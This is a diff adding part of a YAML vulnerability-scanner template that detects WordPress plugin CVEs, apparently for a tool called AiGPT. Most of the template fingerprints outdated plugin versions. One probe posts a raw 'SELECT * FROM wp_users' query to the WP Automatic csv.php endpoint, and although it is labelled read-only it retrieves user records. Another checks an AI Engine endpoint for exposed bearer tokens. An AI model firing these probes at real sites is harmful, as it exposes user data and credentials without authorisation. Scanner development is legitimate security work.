+          # Vulnerable if version < 4.1.2
+          - "contains(body, 'Stable tag: 4.1.0') || contains(body, 'Stable tag: 4.1.1') || contains(body, 'Stable tag: 4.0.') || contains(body, 'Stable tag: 3.') || contains(body, 'Stable tag: 2.') || contains(body, 'Stable tag: 1.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-breeze-cache
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/breeze/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 2.4.') || contains(body, 'Stable tag: 2.3.') || contains(body, 'Stable tag: 2.2.') || contains(body, 'Stable tag: 2.1.') || contains(body, 'Stable tag: 2.0.') || contains(body, 'Stable tag: 1.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-listeo-core
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/listeo-core/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 2.0.') || contains(body, 'Stable tag: 1.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-betterdocs
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/betterdocs-pro/readme.txt"
+      - "{{BaseURL}}/wp-content/plugins/betterdocs/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 3.7.') || contains(body, 'Stable tag: 3.6.') || contains(body, 'Stable tag: 3.5.') || contains(body, 'Stable tag: 3.4.') || contains(body, 'Stable tag: 3.3.') || contains(body, 'Stable tag: 3.2.') || contains(body, 'Stable tag: 3.1.') || contains(body, 'Stable tag: 3.0.') || contains(body, 'Stable tag: 2.') || contains(body, 'Stable tag: 1.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-team-plugin
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/team/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 5.0.') || contains(body, 'Stable tag: 4.') || contains(body, 'Stable tag: 3.') || contains(body, 'Stable tag: 2.') || contains(body, 'Stable tag: 1.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-wp-automatic
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/wp-automatic/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 3.5.1') || contains(body, 'Stable tag: 3.5.0') || contains(body, 'Stable tag: 3.4.') || contains(body, 'Stable tag: 3.3.') || contains(body, 'Stable tag: 3.2.') || contains(body, 'Stable tag: 3.1.') || contains(body, 'Stable tag: 3.0.') || contains(body, 'Stable tag: 2.') || contains(body, 'Stable tag: 1.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+
+  # ────────────────────────────────────────────────────────────────────────
+  # PHASE 3 — ADVANCED MULTI‑STEP CHECKS (3 requests)
+  # ────────────────────────────────────────────────────────────────────────
+
+  # AI Engine token endpoint probe (non‑intrusive)
+  # Checks whether the /me endpoint responds with JSON that could contain
+  # a bearer token, without actually extracting or exploiting it.
+  - id: ai-engine-token-check
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-json/ai-engine/v1/me"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+        condition: and
+      - type: word
+        part: body
+        words:
+          - '"token"'
+        condition: or
+      - type: word
+        part: body
+        words:
+          - '"bearer"'
+        condition: or
+    internal: true
+
+  # WP Automatic CSV endpoint SQLi probe (read‑only detection)
+  # Sends a safe, read‑only query to verify the endpoint accepts SQL.
+  # No data is modified; this only checks for the vulnerability pattern.
+  - id: wp-automatic-sqli-probe
+    method: POST
+    path:
+      - "{{BaseURL}}/wp-content/plugins/wp-automatic/inc/csv.php"
+    headers:
+      User-Agent: "{{rand_agent}}"
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "q=SELECT%20*%20FROM%20wp_users%20WHERE%201%3D1&auth=%20&integ="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "user_login"
+        condition: or
+    internal: true
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║  EXTRACTION & REPORTING                                                ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+# Results are auto‑generated: each matching request ID maps directly to a
+# CVE in the info block. The extractors below enrich output with version
+# information and plugin slugs for downstream tooling (e.g., AiGPT).
+#
+# OUTPUT EXAMPLE (JSON):
+# {
+#   "template-id": "aigpt-wordpress-multi-cve-detection-v3",
+#   "info": { "name": "AiGPT Framework — WordPress Multi‑CVE Detection" },
+#   "matched-at": "https://target.com/wp-content/plugins/king-addons/",
+#   "extracted-results": ["version: 24.12.92"],
+#   "curl-command": "curl -X GET 'https://target.com/wp-content/...'"
+# }
+#
+# Note: The `internal: true` flag on all requests prevents them from
+# printing individually; only the template‑level matchers generate
+# user‑visible output (the final result).
+# ==========================================================================
